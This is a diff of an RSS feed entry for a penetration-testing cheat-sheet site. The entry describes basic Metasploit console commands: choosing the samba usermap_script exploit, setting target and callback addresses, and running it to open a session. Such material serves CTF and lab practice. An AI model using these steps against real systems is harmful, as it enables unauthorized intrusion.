@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/metasploit/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit/</guid>
-      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
+      <description>msfconsole meterpreter Start msfconsole msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
       <title>Searchsploit</title>
